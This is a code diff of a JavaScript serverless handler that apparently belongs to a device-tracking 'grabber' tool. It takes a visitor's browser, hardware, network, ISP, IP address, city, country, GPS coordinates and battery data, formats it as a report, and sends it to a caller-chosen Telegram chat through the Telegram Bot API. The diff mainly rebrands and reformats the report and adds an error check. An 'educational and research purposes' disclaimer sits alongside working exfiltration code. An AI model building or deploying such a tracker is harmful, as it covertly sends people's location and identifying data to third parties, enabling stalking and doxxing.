@@ -6,42 +6,42 @@ export default async (req, res) => {
   try {
     const { telegramId, ...d } = req.body;
 
-    const message = `**🔰 Opas Labs 🔰**\n\n` +
-    `🌐 **Basic Info:**\n` +
-    `- Browser: ${d.browser}\n` +
-    `- Platform: ${d.platform}\n` +
-    `- Language: ${d.language}\n` +
-    `- Timezone: ${d.timezone}\n\n` +
+    const message = `**🔰 Device Information Report 🔰**\n\n` +
+      `🌐 **Basic Info:**\n` +
+      `- Browser: ${d.browser}\n` +
+      `- Platform: ${d.platform}\n` +
+      `- Language: ${d.language}\n` +
+      `- Timezone: ${d.timezone}\n\n` +
 
-    `💻 **Hardware:**\n` +
-    `- CPU: ${d.cpu}\n` +
-    `- RAM: ${d.ram}\n` +
-    `- Screen: ${d.screen}\n` +
-    `- WebGL: ${d.webgl}\n\n` +
+      `💻 **Hardware:**\n` +
+      `- CPU: ${d.cpu}\n` +
+      `- RAM: ${d.ram}\n` +
+      `- Screen: ${d.screen}\n` +
+      `- WebGL: ${d.webgl}\n\n` +
 
-    `📶 **Network:**\n` +
-    `- Type: ${d.networkType}\n` +
-    `- Speed: ${d.networkSpeed}\n` +
-    `- Latency: ${d.latency}\n` +
-    `- Data Saver: ${d.dataSaver}\n` +
-    `- ISP: ${d.location.isp}\n\n` +
+      `📶 **Network:**\n` +
+      `- Type: ${d.networkType}\n` +
+      `- Speed: ${d.networkSpeed}\n` +
+      `- Latency: ${d.latency}\n` +
+      `- Data Saver: ${d.dataSaver}\n` +
+      `- ISP: ${d.location.isp}\n\n` +
 
-    `📍 **IP Info:**\n` +
-    `- IP: ${d.ip}\n` +
-    `- City: ${d.location.city}\n` +
-    `- Region: ${d.location.region}\n` +
-    `- Country: ${d.location.country}\n` +
-    `- GPS: ${d.gps}\n\n` +
-    `_Note: IP-based location may not be accurate._\n\n` +
+      `📍 **IP Info:**\n` +
+      `- IP: ${d.ip}\n` +
+      `- City: ${d.location.city}\n` +
+      `- Region: ${d.location.region}\n` +
+      `- Country: ${d.location.country}\n` +
+      `- GPS: ${d.gps}\n\n` +
+      `_Note: IP-based location may not be accurate._\n\n` +
 
-    `🔋 **Battery:**\n` +
-    `- Level: ${d.batteryLevel}\n` +
-    `- Charging: ${d.charging}\n\n` +
+      `🔋 **Battery:**\n` +
+      `- Level: ${d.batteryLevel}\n` +
+      `- Charging: ${d.charging}\n\n` +
 
-    `"Disclaimer: This data is collected for educational and research purposes only. It is not intended for misuse. Accuracy of the information is not guaranteed and may vary depending on browser settings, device limitations, or VPN/proxy usage."`;
+      `⚠️ **Disclaimer:** This data is collected for educational and research purposes only. Accuracy is not guaranteed.`;
 
     // Send message to Telegram
-    await fetch(
+    const response = await fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
       {
         method: 'POST',
@@ -53,6 +53,10 @@ export default async (req, res) => {
         })
       }
     );
+
+    if (!response.ok) {
+      throw new Error('Failed to send message to Telegram');
+    }
 
     res.status(200).json({ success: true });
   } catch (error) {
